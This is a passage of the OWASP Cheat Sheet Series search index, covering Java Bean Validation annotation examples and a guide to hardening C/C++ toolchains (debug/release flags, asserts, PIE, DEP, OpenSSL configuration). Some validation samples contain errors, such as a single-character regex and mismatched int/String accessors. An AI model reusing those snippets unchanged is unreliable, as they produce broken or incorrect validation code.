org.hibernate.validator.constraints.Pattern ; public class Article { //Constraint: Alpha Numeric article titles only using a regular expression @Pattern ( regexp = \"[a-zA-Z0-9 ]\" ) private String articleTitle ; public String getArticleTitle () { return articleTitle ; } public void setArticleTitle ( String articleTitle ) { this . articleTitle = articleTitle ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.Article ; @Controller public class ArticleController { ... @RequestMapping ( value = \"/postArticle\" , method = RequestMethod . POST ) public @ResponseBody String postArticle ( @Valid Article article , BindingResult result , HttpServletResponse response ) { if ( result . hasErrors ()) { String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ) { errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } }","title":"@Pattern"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#digits","text":"Annotation : @Digits(integer=,fraction=) Data Type : BigDecimal , BigInteger , CharSequence , byte , short , int , long and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of Number Use : Checks whether the annotated value is a number having up to integer digits and fraction fractional digits Reference : Documentation Model : import org.hibernate.validator.constraints.Digits ; public class Customer { //Constraint: Age can only be 3 digits long or less @Digits ( integer = 3 , fraction = 0 ) private int age ; public String getAge () { return age ; } public void setAge ( String age ) { this . age = age ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.Customer ; @Controller public class CustomerController { ... @RequestMapping ( value = \"/registerCustomer\" , method = RequestMethod . POST ) public @ResponseBody String registerCustomer ( @Valid Customer customer , BindingResult result , HttpServletResponse response ) { if ( result . hasErrors ()) { String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ) { errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } }","title":"@Digits"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#size","text":"Annotation : @Size(min=, max=) Data Type : CharSequence , Collection , Map and Arrays Use : Checks if the annotated element's size is between min and max (inclusive) Reference : Documentation Model : import org.hibernate.validator.constraints.Size ; public class Message { //Constraint: Message must be at least 10 characters long, but less than 500 @Size ( min = 10 , max = 500 ) private String message ; public String getMessage () { return message ; } public void setMessage ( String message ) { this . message = message ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.Message ; @Controller public class MessageController { ... @RequestMapping ( value = \"/sendMessage\" , method = RequestMethod . POST ) public @ResponseBody String sendMessage ( @Valid Message message , BindingResult result , HttpServletResponse response ){ if ( result . hasErrors ()){ String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ){ errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } }","title":"@Size"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#past-future","text":"Annotation : @Past, @Future Data Type : java.util.Date , java.util.Calendar , java.time.chrono.ChronoZonedDateTime , java.time.Instant , java.time.OffsetDateTime Use : Checks whether the annotated date is in the past / future Reference : Documentation Model : import org.hibernate.validator.constraints.Past ; import org.hibernate.validator.constraints.Future ; public class DoctorVisit { //Constraint: Birthdate must be in the past @Past private Date birthDate ; public Date getBirthDate () { return birthDate ; } public void setBirthDate ( Date birthDate ) { this . birthDate = birthDate ; } //Constraint: Schedule visit date must be in the future @Future private String scheduledVisitDate ; public String getScheduledVisitDate () { return scheduledVisitDate ; } public void setScheduledVisitDate ( String scheduledVisitDate ) { this . scheduledVisitDate = scheduledVisitDate ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.DoctorVisit ; @Controller public class DoctorVisitController { ... @RequestMapping ( value = \"/scheduleVisit\" , method = RequestMethod . POST ) public @ResponseBody String scheduleVisit ( @Valid DoctorVisit doctorvisit , BindingResult result , HttpServletResponse response ){ if ( result . hasErrors ()){ String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ){ errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } }","title":"@Past / @Future"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#combining-constraints","text":"Validation annotations can be combined in any suitable way. For instance, to specify a valid reviewRating value between 1 and 5, specify the validation like this : Annotation : @Min(value=), @Max(value=) Data Type : BigDecimal , BigInteger , byte , short , int , long and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of CharSequence (the numeric value represented by the character sequence is evaluated), any sub-type of Number Use : Checks whether the annotated value is higher/lower than or equal to the specified minimum Reference: Documentation Model : import org.hibernate.validator.constraints.Min ; import org.hibernate.validator.constraints.Max ; public class Review { //Constraint: Review rating must be between 1 and 5 @Min ( 1 ) @Max ( 5 ) private int reviewRating ; public int getReviewRating () { return reviewRating ; } public void setReviewRating ( int reviewRating ) { this . reviewRating = reviewRating ; } ... } Controller : import javax.validation.Valid ; import com.company.app.model.ReviewRating ; @Controller public class ReviewController { ... @RequestMapping ( value = \"/postReview\" , method = RequestMethod . POST ) public @ResponseBody String postReview ( @Valid Review review , BindingResult result , HttpServletResponse response ){ if ( result . hasErrors ()){ String errorMessage = \"\" ; response . setStatus ( HttpServletResponse . SC_BAD_REQUEST ); List < ObjectError > errors = result . getAllErrors (); for ( ObjectError e : errors ){ errorMessage += \"ERROR: \" + e . getDefaultMessage (); } return errorMessage ; } else { return \"Validation Successful\" ; } } }","title":"Combining Constraints"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#cascading-constraints","text":"Validating one bean is a good start, but often, beans are nested or in a complete graph of beans. To validate that graph in one go, apply cascading validation with @Valid","title":"Cascading Constraints"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#additional-constraints","text":"In addition to providing the complete set of JSR303 constraints, Hibernate Validator also defines some additional constraints for convenience: @CreditCardNumber @EAN @Email @Length @Range @SafeHtml @ScriptAssert @URL Take a look at this table for the complete list.","title":"Additional Constraints"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#custom-constraints","text":"One of the most powerful features of bean validation is the ability to define your own constraints that go beyond the simple validation offered by built-in constraints. Creating custom constraints is beyond the scope of this guide. Please see this documentation .","title":"Custom Constraints"},{"location":"cheatsheets/Bean_Validation_Cheat_Sheet.html#error-messages","text":"It is possible to specify a message ID with the validation annotation, so that error messages are customized : @Pattern ( regexp = \"[a-zA-Z0-9 ]\" , message = \"article.title.error\" ) private String articleTitle ; Spring MVC will then look up a message with ID article.title.error in a defined MessageSource. More on this documentation .","title":"Error Messages"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html","text":"C-Based Toolchain Hardening \u00b6 Introduction \u00b6 C-Based Toolchain Hardening is a treatment of project settings that will help you deliver reliable and secure code when using C, C++ and Objective C languages in a number of development environments. This article will examine Microsoft and GCC toolchains for the C, C++ and Objective C languages. It will guide you through the steps you should take to create executables with firmer defensive postures and increased integration with the available platform security. Effectively configuring the toolchain also means your project will enjoy a number of benefits during development, including enhanced warnings and static analysis, and self-debugging code. There are four areas to be examined when hardening the toolchain: configuration, preprocessor, compiler, and linker. Nearly all areas are overlooked or neglected when setting up a project. The neglect appears to be pandemic, and it applies to nearly all projects including Auto-configured projects, Makefile-based, Eclipse-based, Visual Studio-based, and Xcode-based. Its important to address the gaps at configuration and build time because its difficult to impossible to add hardening on a distributed executable after the fact on some platforms. This is a prescriptive article, and it will not debate semantics or speculate on behavior. Some information, such as the C/C++ committee's motivation and pedigree for program diagnostics , NDEBUG , assert , and abort() , appears to be lost like a tale in the Lord of the Rings. As such, the article will specify semantics (for example, the philosophy of 'debug' and 'release' build configurations), assign behaviors (for example, what an assert should do in a 'debug' and 'release' build configurations), and present a position. If you find the posture is too aggressive, then you should back off as required to suite your taste. A secure toolchain is not a silver bullet. It is one piece of an overall strategy in the engineering process to help ensure success. It will compliment existing processes such as static analysis, dynamic analysis, secure coding, negative test suites, and the like. Tools such as Valgrind and Helgrind will still be needed. And a project will still require solid designs and architectures. The OWASP ESAPI C++ project eats its own dog food. Many of the examples you will see in this article come directly from the ESAPI C++ project. Finally, a Cheat Sheet is available for those who desire a terse treatment of the material. Please visit C-Based Toolchain Hardening Cheat Sheet for the abbreviated version. Wisdom \u00b6 Code must be correct. It should be secure. It can be efficient. Dr. Jon Bentley : \"If it doesn't have to be correct, I can make it as fast as you'd like it to be\" . Dr. Gary McGraw : \"Thou shalt not rely solely on security features and functions to build secure software as security is an emergent property of the entire system and thus relies on building and integrating all parts properly\" . Configuration \u00b6 Configuration is the first opportunity to configure your project for success. Not only do you have to configure your project to meet reliability and security goals, you must also configure integrated libraries properly. You typically have has three choices. First, you can use auto-configuration utilities if on Linux or Unix. Second, you can write a makefile by hand. This is predominant on Linux, macOS, and Unix, but it applies to Windows as well. Finally, you can use an integrated development environment or IDE. Build Configurations \u00b6 At this stage in the process, you should concentrate on configuring for two builds: Debug and Release. Debug will be used for development and include full instrumentation. Release will be configured for production. The difference between the two settings is usually optimization level and debug level . A third build configuration is Test, and its usually a special case of Release. For debug and release builds, the settings are typically diametrically opposed. Debug configurations have no optimizations and full debug information; while Release builds have optimizations and minimal to moderate debug information. In addition, debug code has full assertions and additional library integration, such as mudflaps and malloc guards such as dmalloc . The Test configuration is often a Release configuration that makes everything public for testing and builds a test harness. For example, all member functions public (C++ class) and all interfaces (library or shared object) should be made available for testing. Many Object Oriented purist oppose testing private interfaces, but this is not about object oriented-ness. This ( q.v. ) is about building reliable and secure software. GCC 4.8 introduced an optimization of -Og . Note that it is only an optimization, and still requires a customary debug level via -g . Debug Builds \u00b6 Debug builds are where developers spend most of their time when vetting problems, so this build should concentrate forces and tools or be a 'force multiplier'. Though many do not realize, debug code is more highly valued than release code because its adorned with additional instrumentation. The debug instrumentation will cause a program to become nearly \"self-debugging\", and help you catch mistakes such as bad parameters, failed API calls, and memory problems. Self-debugging code reduces your time during trouble shooting and debugging. Reducing time under the debugger means you have more time for development and feature requests. If code is checked in without debug instrumentation, it should be fixed by adding instrumentation or rejected. For GCC, optimizations and debug symbolication are controlled through two switches: -O and -g . You should use the following as part of your CFLAGS and CXXFLAGS for a minimal debug session: -O0 -g3 -ggdb -O0 turns off optimizations and -g3 ensures maximum debug information is available. You may need to use -O1 so some analysis is performed. Otherwise, your debug build will be missing a number of warnings not present in release builds. -g3 ensures maximum debugging information is available for the debug session, including symbolic constants and #defines . -ggdb includes extensions to help with a debug session under GDB. For completeness, Jan Krachtovil stated -ggdb currently has no effect in a private email. Release builds should also consider the configuration pair of -mfunction-return=thunk and -mindirect-branch=thunk . These are the \"Reptoline\" fix which is an indirect branch used to thwart speculative execution CPU vulnerabilities such as Spectre and Meltdown. The CPU cannot tell what code to speculatively execute because it is an indirect (as opposed to a direct) branch. This is an extra layer of indirection, like calling a pointer through a pointer. Debug build should also define DEBUG , and ensure NDEBUG is not defined. NDEBUG removes \"program diagnostics\"; and has undesirable behavior and side effects which discussed below in more detail. The defines should be present for all code, and not just the program. You use it for all code (your program and included libraries) because you need to know how they fail too (remember, you take the bug report - not the third party library). In addition, you should use other relevant flags, such as -fno-omit-frame-pointer . Ensuring a frame pointer exists makes it easier to decode stack traces. Since debug builds are not shipped, its OK to leave symbols in the executable. Programs with debug information do not suffer performance hits. See, for example, How does the gcc -g option affect performance? Finally, you should ensure your project includes additional diagnostic libraries, such as dmalloc and Address Sanitizer . A comparison of some memory checking tools can be found at Comparison Of Memory Tools . If you don't include additional diagnostics in debug builds, then you should start using them sinces its OK to find errors you are not looking for. Release Builds \u00b6 Release builds are what your customer receives. They are meant to be run on production hardware and servers, and they should be reliable, secure, and efficient. A stable release build is the product of the hard work and effort during development. For release builds, you should use the following as part of CFLAGS and CXXFLAGS for release builds: -On -g2 -O n sets optimizations for speed or size (for example, -Os or -O2 ), and -g2 ensure debugging information is created. Debugging information should be stripped and retained in case of symbolication for a crash report from the field. While not desired, debug information can be left in place without a performance penalty. See How does the gcc -g option affect performance? for details. Release builds should also define NDEBUG , and ensure DEBUG is not defined. The time for debugging and diagnostics is over, so users get production code with full optimizations, no \"programming diagnostics\", and other efficiencies. If you can't optimize or your are performing excessive logging, it usually means the program is not ready for production. If you have been relying on an assert and then a subsequent abort() , you have been abusing \"program diagnostics\" since it has no place in production code. If you want a memory dump, create one so users don't have to worry about secrets and other sensitive information being written to the filesystem and emailed in plain text. For Windows, you would use /Od for debug builds; and /Ox , /O2 or /Os for release builds. See Microsoft's /O Options (Optimize Code) for details. Test Builds \u00b6 Test builds are used to provide heuristic validation by way of positive and negative test suites. Under a test configuration, all interfaces are tested to ensure they perform to specification and satisfaction. \"Satisfaction\" is subjective, but it should include no crashing and no trashing of your memory arena, even when faced with negative tests. Because all interfaces are tested (and not just the public ones), your CFLAGS and CXXFLAGS should include: -Dprotected=public -Dprivate=public You should also change __attribute__ ((visibility (\"hidden\"))) to __attribute__ ((visibility (\"default\"))) . Nearly everyone gets a positive test right, so no more needs to be said. The negative self tests are much more interesting, and you should concentrate on trying to make your program fail so you can verify its fails gracefully. Remember, a bad guy is not going to be courteous when he attempts to cause your program to fail. And its your project that takes egg on the face by way of a bug report or guest appearance on Full Disclosure or Bugtraq - not <some library> you included. Auto Tools \u00b6 Auto configuration tools are popular on many Linux and Unix based systems, and the tools include Autoconf , Automake , config , and Configure . The tools work together to produce project files from scripts and template files. After the process completes, your project should be setup and ready to be made with make . When using auto configuration tools, there are a few files of interest worth mentioning. The files are part of the auto tools chain and include m4 and the various *.in , *.ac (autoconf), and *.am (automake) files. At times, you will have to open them, or the resulting makefiles, to tune the \"stock\" configuration. There are three downsides to the command-line configuration tools in the toolchain: (1) they often ignore user requests, (2) they cannot create configurations, and (3) security is often not a goal. To demonstrate the first issue, confider your project with the following: configure CFLAGS=\"-Wall -fPIE\" CXXFLAGS=\"-Wall -fPIE\" LDFLAGS=\"-pie\" . You will probably find the auto tools ignored your request, which means the command below will not produce expected results. As a work around, you will have to open an m4 scripts, Makefile.in or Makefile.am and fix the configuration. $ configure CFLAGS = \"-Wall -Wextra -Wconversion -fPIE -Wno-unused-parameter -Wformat=2 -Wformat-security -fstack-protector-all -Wstrict-overflow\" LDFLAGS = \"-pie -z,noexecstack -z,noexecheap -z,relro -z,now\" For the second point, you will probably be disappointed to learn Automake does not support the concept of configurations . Its not entirely Autoconf's or Automake's fault - Make and its inability to detect changes is the underlying problem. Specifically, Make only checks modification times of prerequisites and targets , and does not check things like CFLAGS and CXXFLAGS . The net effect is you will not receive expected results when you issue make debug and then make test or make release . Finally, you will probably be disappointed to learn tools such as Autoconf and Automake miss many security related opportunities and ship insecure out of the box. There are a number of compiler switches and linker flags that improve the defensive posture of a program, but they are not 'on' by default. Tools like Autoconf - which are supposed to handle this situation - often provides setting to serve the lowest of all denominators. A recent discussion on the Automake mailing list illuminates the issue: Enabling compiler warning flags . Attempts to improve default configurations were met with resistance and no action was taken. The resistance is often of the form, \" <some useful warning> also produces false positives \" or \" <some obscure platform> does not support <established security feature> \". Its noteworthy that David Wheeler, the author of Secure Programming for Linux and Unix HOWTO , was one of the folks trying to improve the posture. Makefiles \u00b6 Make is one of the earliest build tools dating back to the 1970s. Its available on Linux, macOS and Unix, so you will frequently encounter projects using it. Unfortunately, Make has a number of short comings ( Recursive Make Considered Harmful and What's Wrong With GNU make? ), and can cause some discomfort. Despite issues with Make, ESAPI C++ uses Make primarily for three reasons: first, its omnipresent; second, its easier to manage than the Auto Tools family; and third, libtool was out of the question. Consider what happens when you: (1) type make debug , and then type make release . Each build would require different CFLAGS due to optimizations and level of debug support. In your makefile, you would extract the relevant target and set CFLAGS and CXXFLAGS similar to below (taken from ESAPI C++ Makefile ): ## Makefile DEBUG_GOALS = $(filter $(MAKECMDGOALS), debug) ifneq ($(DEBUG_GOALS),) WANT_DEBUG := 1 WANT_TEST := 0 WANT_RELEASE := 0 endif \u2026 ifeq ($(WANT_DEBUG),1) ESAPI_CFLAGS += -DDEBUG=1 -UNDEBUG -g3 -ggdb -O0 ESAPI_CXXFLAGS += -DDEBUG=1 -UNDEBUG -g3 -ggdb -O0 endif ifeq ($(WANT_RELEASE),1) ESAPI_CFLAGS += -DNDEBUG=1 -UDEBUG -g -O2 ESAPI_CXXFLAGS += -DNDEBUG=1 -UDEBUG -g -O2 endif ifeq ($(WANT_TEST),1) ESAPI_CFLAGS += -DESAPI_NO_ASSERT=1 -g2 -ggdb -O2 -Dprivate=public -Dprotected=public ESAPI_CXXFLAGS += -DESAPI_NO_ASSERT=1 -g2 -ggdb -O2 -Dprivate=public -Dprotected=public endif \u2026 ## Merge ESAPI flags with user supplied flags. We perform the extra step to ensure ## user options follow our options, which should give user option's a preference. override CFLAGS := $(ESAPI_CFLAGS) $(CFLAGS) override CXXFLAGS := $(ESAPI_CXXFLAGS) $(CXXFLAGS) override LDFLAGS := $(ESAPI_LDFLAGS) $(LDFLAGS) \u2026 Make will first build the program in a debug configuration for a session under the debugger using a rule similar to: %.cpp:%.o: $(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $< -o $@ When you want the release build, Make will do nothing because it considers everything up to date despite the fact CFLAGS and CXXFLAGS have changed. Hence, your program will actually be in a debug configuration and risk a SIGABRT at runtime because debug instrumentation is present (recall assert calls abort() when NDEBUG is not defined). In essence, you have DoS'd yourself due to make . In addition, many projects do not honor the user's command-line. ESAPI C++ does its best to ensure a user's flags are honored via override as shown above, but other projects do not. For example, consider a project that should be built with Position Independent Executable (PIE or ASLR) enabled and data execution prevention (DEP) enabled. Dismissing user settings combined with insecure out of the box settings (and not picking them up during auto-setup or auto-configure) means a program built with the following will likely have neither defense: make CFLAGS = \"-fPIE\" CXXFLAGS = \"-fPIE\" LDFLAGS = \"-pie -z,noexecstack, -z,noexecheap\" Defenses such as ASLR and DEP are especially important on Linux because Data Execution - not Prevention - is the norm . Integration \u00b6 Project level integration presents opportunities to harden your program or library with domain specific knowledge. For example, if the platform supports Position Independent Executables (PIE or ASLR) and data execution prevention (DEP), then you should integrate with it. The consequences of not doing so could result in exploitation. As a case in point, see KingCope's 0-days for MySQL in December, 2012 (CVE-2012-5579 and CVE-2012-5612, among others). Integration with platform security would have neutered a number of the 0-days. You also have the opportunity to include helpful libraries that are not need for business logic support. For example, if you are working on a platform with DMalloc or Address Sanitizer , you should probably use it in your debug builds. For Ubuntu, DMalloc available from the package manager and can be installed with sudo apt install libdmalloc5 . For Apple platforms, its available as a scheme option. Address Sanitizer is available in GCC 4.8 and above for many platforms. In addition, project level integration is an opportunity to harden third party libraries you chose to include. Because you chose to include them, you and your users are responsible for them. If you or your users endure a SP800-53 audit, third party libraries will be in scope because the supply chain is included (specifically, item SA-12, Supply Chain Protection). The audits are not limited to those in the US Federal arena - financial institutions perform reviews too. A perfect example of violating this guidance is CVE-2012-1525 , which was due to Adobe's inclusion of a defective Sablotron library . Another example is including OpenSSL. You know (1) SSLv2 is insecure , (2) SSLv3 is insecure , and (3) compression is insecure (among others). In addition, suppose you don't use hardware and engines, and only allow static linking. Given the knowledge and specifications, you would configure the OpenSSL library as follows: $ Configure darwin64-x86_64-cc -no-hw -no-engine -no-comp -no-shared -no-dso -no-ssl2 -no-ssl3 --openssldir = \u2026 Note Well : you might want engines, especially on Ivy Bridge microarchitectures (3rd generation Intel Core i5 and i7 processors). To have OpenSSL use the processor's random number generator (via the of rdrand instruction), you will need to call OpenSSL's ENGINE_load_rdrand() function and then ENGINE_set_default with ENGINE_METHOD_RAND . See OpenSSL's Random Numbers for details. If you configure without the switches, then you will likely have vulnerable code/libraries and risk failing an audit. If the program is a remote server, then the following command will reveal if compression is active on the channel: echo \"GET / HTTP1.0\" | openssl s_client -connect <nowiki>example.com:443</nowiki> nm or openssl s_client will show that compression is enabled in the client. In fact, any symbol within the OPENSSL_NO_COMP preprocessor macro will bear witness since -no-comp is translated into a CFLAGS define. $ nm /usr/local/ssl/iphoneos/lib/libcrypto.a 2 >/dev/null | egrep -i \"(COMP_CTX_new|COMP_CTX_free)\" 0000000000000110 T COMP_CTX_free 0000000000000000 T COMP_CTX_new Even more egregious is the answer given to auditors who specifically ask about configurations and protocols: \"we don't use weak/wounded/broken ciphers\" or \"we follow best practices.\" The use of compression tells the auditor that you are using wounded protocol in an insecure configuration and you don't follow best practices. That will likely set off alarm bells, and ensure the auditor dives deeper on more items. Preprocessor \u00b6 The preprocessor is crucial to setting up a project for success. The C committee provided one macro - NDEBUG - and the macro can be used to derive a number of configurations and drive engineering processes. Unfortunately, the committee also left many related items to chance, which has resulted in programmers abusing built-in facilities. This section will help you set up you projects to integrate well with other projects and ensure reliability and security. There are three topics to discuss when hardening the preprocessor. The first is well defined configurations which produce well defined behaviors, the second is useful behavior from assert, and the third is proper use of macros when integrating vendor code and third party libraries. Configurations \u00b6 To remove ambiguity, you should recognize two configurations: Release and Debug. Release is for production code on live servers, and its behavior is requested via the C/C++ NDEBUG macro. Its also the only macro observed by the C and C++ Committees and Posix. Diametrically opposed to release is Debug. While there is a compelling argument for !defined(NDEBUG) , you should have an explicit macro for the configuration and that macro should be DEBUG . This is because vendors and outside libraries use DEBUG (or similar) macro for their configuration. For example, Carnegie Mellon's Mach kernel uses DEBUG , Microsoft's CRT uses _DEBUG , and Wind River Workbench uses DEBUG_MODE . In addition to NDEBUG (Release) and DEBUG (Debug), you have two additional cross products: both are defined or neither are defined. Defining both should be an error, and defining neither should default to a release configuration. Below is from ESAPI C++ EsapiCommon.h , which is the configuration file used by all source files: // Only one or the other, but not both ##if (defined(DEBUG) || defined(_DEBUG)) && (defined(NDEBUG) || defined ( _NDEBUG )) ## error Both DEBUG and NDEBUG are defined. ##endif // The only time we switch to debug is when asked. // NDEBUG or {nothing} results // in release build (fewer surprises at runtime). ##if defined(DEBUG) || defined(_DEBUG) ## define ESAPI_BUILD_DEBUG 1 ##else ## define ESAPI_BUILD_RELEASE 1 ##endif When DEBUG is in effect, your code should receive full debug instrumentation, including the full force of assertions. ASSERT \u00b6 Asserts will help you create self-debugging code by helping you find the point of first failure quickly and easily. Asserts should be used throughout your program, including parameter validation, return value checking and program state. The assert will silently guard your code through its lifetime. It will always be there, even when not debugging a specific component of a module. If you have thorough code coverage, you will spend less time debugging and more time developing because programs will debug themselves. To use asserts effectively, you should assert everything. That includes parameters upon entering a function, return values from function calls, and any program state. Everywhere you place an if statement for validation or checking, you should have an assert. Everywhere you have an assert for validation or checking, you should have an if statement. They go hand-in-hand. If you are still using printf 's, then you have an opportunity for improvement. In the time it takes for you to write a printf or NSLog statement, you could have written an assert . Unlike the printf or NSLog which are often removed when no longer needed, the assert stays active forever. Remember, this is all about finding the point of first failure quickly so you can spend your time doing other things. There is one problem with using asserts - Posix states assert should call abort() if NDEBUG is not defined. When debugging, NDEBUG will never be defined since you want the \"program diagnostics\" (quote from the Posix description). The behavior makes assert and its accompanying abort() completely useless for development. The result of \"program diagnostics\" calling abort() due to standard C/C++ behavior is disuse - developers simply don't use them. Its incredibly bad for the development community because self-debugging programs can help eradicate so many stability problems. Since self-debugging programs are so powerful, you will have to have to supply your own assert and signal handler with improved behavior. Your assert will exchange auto-aborting behavior for auto-debugging behavior. The auto-debugging facility will ensure the debugger snaps when a problem is detected, and you will find the point of first failure quickly and easily. ESAPI C++ supplies its own assert with the behavior described above. In the code below, ASSERT raises SIGTRAP when in effect or it evaluates to void in other cases. // A debug assert which should be sprinkled liberally. // This assert fires and then continues rather // than calling abort(). Useful when examining negative // test cases from the command-line. ##if (defined(ESAPI_BUILD_DEBUG) && defined(ESAPI_OS_STARNIX)) ## define ESAPI_ASSERT1(exp) { \\ if(!(exp)) { \\ std::ostringstream oss; \\ oss << \"Assertion failed: \" << (char*)(__FILE__) << \"(\" \\ << (int)__LINE__ << \"): \" << (char*)(__func__) \\ << std::endl; \\ std::cerr << oss.str(); \\ raise(SIGTRAP); \\ } \\ } ## define ESAPI_ASSERT2(exp, msg) { \\ if(!(exp)) { \\ std::ostringstream oss; \\ oss << \"Assertion failed: \" << (char*)(__FILE__) << \"(\" \\ << (int)__LINE__ << \"): \" << (char*)(__func__) \\ << \": \\\"\" << (msg) << \"\\\"\" << std::endl; \\ std::cerr << oss.str(); \\ raise(SIGTRAP); \\ } \\ } ##elif (defined(ESAPI_BUILD_DEBUG) && defined(ESAPI_OS_WINDOWS)) ## define ESAPI_ASSERT1(exp) assert(exp) ## define ESAPI_ASSERT2(exp, msg) assert(exp) ##else ## define ESAPI_ASSERT1(exp) ((void)(exp)) ## define ESAPI_ASSERT2(exp, msg) ((void)(exp)) ##endif ##if !defined(ASSERT) ## define ASSERT(exp) ESAPI_ASSERT1(exp) ##endif At program startup, a SIGTRAP handler will be installed if one is not provided by another component: struct DebugTrapHandler { DebugTrapHandler () { struct sigaction new_handler , old_handler ; do { int ret = 0 ; ret = sigaction ( SIGTRAP , NULL , & old_handler ); if ( ret != 0 ) break ; // Failed // Don't step on another's handler if ( old_handler . sa_handler != NULL ) break ; new_handler . sa_handler = & DebugTrapHandler :: NullHandler ; new_handler . sa_flags = 0 ; ret = sigemptyset ( & new_handler . sa_mask ); if ( ret != 0 ) break ; // Failed ret = sigaction ( SIGTRAP , & new_handler , NULL ); if ( ret != 0 ) break ; // Failed } while ( 0 ); } static void NullHandler ( int /*unused*/ ) { } }; // We specify a relatively low priority, to make sure we run before other CTORs // http://gcc.gnu.org/onlinedocs/gcc/C_002b_002b-Attributes.html#C_002b_002b-Attributes static const DebugTrapHandler g_dummyHandler __attribute__ (( init_priority ( 110 ))); On a Windows platform, you would call _set_invalid_parameter_handler (and possibly set_unexpected or set_terminate ) to install a new handler. Live hosts running production code should always define NDEBUG (i.e., release configuration), which means they do not assert or auto-abort. Auto-abortion is not acceptable behavior, and anyone who asks for the behavior is completely abusing the functionality of \"program diagnostics\". If a program wants a core dump, then it should create the dump rather than crashing. For more reading on asserting effectively, please see one of John Robbin's books, such as Debugging Applications . John is a legendary bug slayer in Windows circles, and he will show you how to do nearly everything, from debugging a simple program to bug slaying in multithreaded programs. Additional Macros \u00b6 Additional macros include any macros needed to integrate properly and securely. It includes integrating the program with the platform (for example MFC or Cocoa/CocoaTouch) and libraries (for example, Crypto++ or OpenSSL). It can be a challenge because you have to have proficiency with your platform and all included libraries and frameworks. The list below illustrates the level of detail you will need when integrating. Though Boost is missing from the list, it appears to lack recommendations, additional debug diagnostics, and a hardening guide. See BOOST Hardening Guide (Preprocessor Macros) for details. In addition, Tim Day points to [boost.build] should we not define _SECURE_SCL=0 by default for all msvc toolsets for a recent discussion related to hardening (or lack thereof). In addition to what you should define, defining some macros and undefining others should trigger a security related defect. For example, -U_FORTIFY_SOURCES on Linux and _CRT_SECURE_NO_WARNINGS=1 , _SCL_SECURE_NO_WARNINGS , _ATL_SECURE_NO_WARNINGS or STRSAFE_NO_DEPRECATE on Windows. a) Be careful with _GLIBCXX_DEBUG when using pre-compiled libraries such as Boost from a distribution. There are ABI incompatibilities, and the result will likely be a crash. You will have to compile Boost with _GLIBCXX_DEBUG or omit _GLIBCXX_DEBUG . b) See Chapter 5, Diagnostics of the libstdc++ manual for details. c) SQLite secure deletion zeroizes memory on destruction. Define as required, and always define in US Federal since zeroization is required for FIPS 140-2, Level 1. d) N is 0644 by default, which means everyone has some access. e) Force temporary tables into memory (no unencrypted data to disk). Compiler and Linker \u00b6 Compiler writers provide a rich set of warnings from the analysis of code during compilation. Both GCC and Visual Studio have static analysis capabilities to help find mistakes early in the development process. The built-in static analysis capabilities of GCC and Visual Studio are usually sufficient to ensure proper API usage and catch a number of mistakes such as using an uninitialized variable or comparing a negative signed int and a positive unsigned int. As a concrete example, (and for those not familiar with C/C++ promotion rules), a warning will be issued if a signed integer is promoted to an unsigned integer and then compared because a side effect is -1 > 1 after promotion! GCC and Visual Studio will not currently catch, for example, SQL injections and other tainted data usage. For that, you will need a tool designed to perform data flow analysis or taint analysis. Some in the development community resist static analysis or refute its results. For example, when static analysis warned the Linux kernel's sys_prctl was comparing an unsigned value against less than zero, Jesper Juhl offered a patch to clean up the code. Linus Torvalds howled \"No, you don't do this\u2026 GCC is crap\" (referring to compiling with warnings). For the full discussion, see [PATCH] Don't compare unsigned variable for <0 in sys_prctl() from the Linux Kernel mailing list. The following sections will detail steps for three platforms. First is a typical GNU Linux based distribution offering GCC and Binutils, second is Clang and Xcode, and third is modern Windows platforms. Distribution Hardening \u00b6 Before discussing GCC and Binutils, it would be a good time to point out some of the defenses discussed below are all ready present in a distribution. Unfortunately, its design by committee, so what is present is usually only a mild variation of what is available (this way, everyone is mildly offended). For those who are purely worried about performance, you might be surprised to learn you have already taken the small performance hint without even knowing. Linux and BSD distributions often apply some hardening without intervention via GCC Spec Files . If you are using Debian, Ubuntu, Linux Mint and family, see Debian Hardening . For Red Hat and Fedora systems, see New hardened build support (coming) in F16 . Gentoo users should visit Hardened Gentoo . You can see the settings being used by a distribution via gcc -dumpspecs . From Linux Mint 12 below, -fstack-protector (but not -fstack-protector-all) is used by default. $ gcc -dumpspecs \u2026 *link_ssp: % { fstack-protector: } *ssp_default: % { !fno-stack-protector:% { !fstack-protector-all: % { !ffreestanding:% { !nostdlib:-fstack-protector }}}} \u2026 The \"SSP\" above stands for Stack Smashing Protector. SSP is a reimplementation of Hiroaki Etoh's work on IBM Pro Police Stack Detector. See Hiroaki Etoh's patch gcc stack-smashing protector and IBM's GCC extension for protecting applications from stack-smashing attacks for details. GCC/Binutils \u00b6 GCC (the compiler collection) and Binutils (the assemblers, linkers, and other tools) are separate projects that work together to produce a final executable. Both the compiler and linker offer options to help you write safer and more secure code. The 